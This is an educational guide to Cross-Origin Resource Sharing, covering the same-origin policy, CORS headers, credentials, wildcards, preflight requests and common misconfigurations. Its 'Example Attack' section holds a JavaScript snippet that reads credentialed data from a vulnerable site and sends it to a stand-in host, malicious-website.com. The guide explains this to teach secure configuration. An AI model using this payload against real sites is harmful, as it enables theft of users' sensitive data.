# Cross-Origin Resource Sharing (CORS) Guide

Cross-Origin Resource Sharing (CORS) is a browser mechanism that allows controlled access to resources located outside of a given domain. It extends the same-origin policy (SOP), adding flexibility but also potential vulnerabilities if not configured correctly.

## Understanding CORS

CORS modifies the SOP by enabling web pages to request resources from different domains using a set of HTTP headers that define trusted origins and permissions.

### Same-Origin Policy (SOP)

The SOP is a security measure that restricts web pages from interacting with resources from a different origin. An origin is defined by the scheme, domain, and port. Here’s how SOP works with different URLs:

- **Example URL**: `http://normal-website.com/example/example.html`
  - **Access within the same domain**:
    - `http://normal-website.com/example/`: Yes
    - `http://normal-website.com/example2/`: Yes
  - **Access across different schemes or ports**:
    - `https://normal-website.com/example/`: No

### CORS Headers and Requests

- **Access-Control-Allow-Origin (ACAO)**: This header in the response specifies which domains are allowed to access the resource.
  - **Example**:
    - Request from `https://normal-website.com` to `https://robust-website.com/data` might receive:
      ```
      Access-Control-Allow-Origin: https://normal-website.com
      ```

### CORS with Credentials

- Servers can allow requests with credentials (like cookies) by setting `Access-Control-Allow-Credentials: true`.
- **Example**:
  - A request with credentials from `https://normal-website.com` receives:
    ```
    Access-Control-Allow-Credentials: true
    ```

### Handling Wildcards

- The ACAO header can specify `*` to allow all domains, which is considered insecure when combined with credentials.

### Pre-flight Requests

- For complex requests (using methods like PUT or DELETE, or custom headers), the browser sends a pre-flight request using the OPTIONS method to ensure safety before sending the actual request.

### Vulnerabilities from Poor CORS Configurations

- Misconfigured CORS can allow unauthorized access, especially when ACAO reflects a wide range of origins or uses unsafe wildcards.
- **Example Attack**:
  - Using JavaScript to exploit a CORS misconfiguration to extract sensitive data:
    ```javascript
    var req = new XMLHttpRequest();
    req.onload = function() { location='//malicious-website.com/log?key='+this.responseText; };
    req.open('get', 'https://vulnerable-website.com/sensitive-data', true);
    req.withCredentials = true;
    req.send();
    ```

### Special Cases and Bypasses

- **Null Origin Handling**: Some servers whitelist `null` which can be exploited in various scenarios.
- **Domain Matching Issues**: Inadequate validation might allow attackers to register similar-looking domains to bypass restrictions.

## CORS and XSS Vulnerabilities

Correct CORS configuration does not guard against XSS, where a trusted but vulnerable site can be exploited to steal data via CORS.

## Example Scenarios

- **Breaking TLS through CORS**: Allowing CORS requests to a domain over HTTP can lead to man-in-the-middle attacks.
  - Attack involves redirecting to an HTTP page which then makes a CORS request to the secure site, tricking it into revealing sensitive information.
